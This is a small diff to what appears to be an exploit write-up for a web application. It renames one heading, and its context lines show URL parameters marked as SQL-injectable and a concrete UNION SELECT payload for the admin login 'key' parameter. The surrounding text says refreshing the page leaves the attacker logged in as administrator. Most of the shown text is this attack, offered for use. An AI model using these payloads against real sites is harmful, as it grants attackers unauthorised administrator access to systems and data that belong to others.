@@ -17,7 +17,7 @@ http://site.com/location.php?type=byId&id=[INT]&childLevel=[INT]&level=[SQLi]
 http://site.com/sitemgr/login.php?key=[SQLi]
 ```
 
-## SQLi to login bypass
+## Admin login bypass by SQLi
 Sometimes returns "Invalid key error", then press F5 and you will logged as an administrator :)
 ```
 http://site.com/sitemgr/login.php?key=' union select 0,1,0,'sitemgr' -- -
